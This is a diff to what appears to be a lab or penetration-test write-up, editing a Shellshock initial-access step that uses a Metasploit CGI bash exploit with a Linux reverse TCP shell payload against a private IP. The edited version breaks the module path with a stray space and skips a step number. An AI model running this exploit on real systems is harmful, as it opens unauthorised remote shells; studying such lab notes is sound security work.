@@ -36,19 +36,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## Initial Access, Execution & Command and Control
 --------
 ### Procedure
-1. Scanned for shellshock vulnerabilities in MSF (Searchsploit could've been used here as well):
-```search shellshock```. The ```apache_mod_cgi_bash_env_exec``` exploit was returned as an applicable MSF module.
-2. Deliver payload via MSF
+1. Scanned for shellshock vulnerabilities in MSF 
+   - command ```search shellshock```.  
+   - ```apache_mod_cgi_bash_env_exec```  was returned as an applicable MSF module.
+3. Deliver payload via MSF
 
 ```
-msfconsole -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec;\
+msfconsole -x "use exploit/multi/http apache_mod_cgi_bash_env_exec;\
 set PAYLOAD payload/linux/x86/shell_reverse_tcp;\
 set TARGETURI /cgi-bin/test/test.cgi;\
 set RHOST 172.16.2.44;\
 set LPORT 4444;\
 set CVE CVE-2014-6278;\
 exploit -z"
-```
+   ```
 
 
 ## Discovery > Collection > Exfiltration
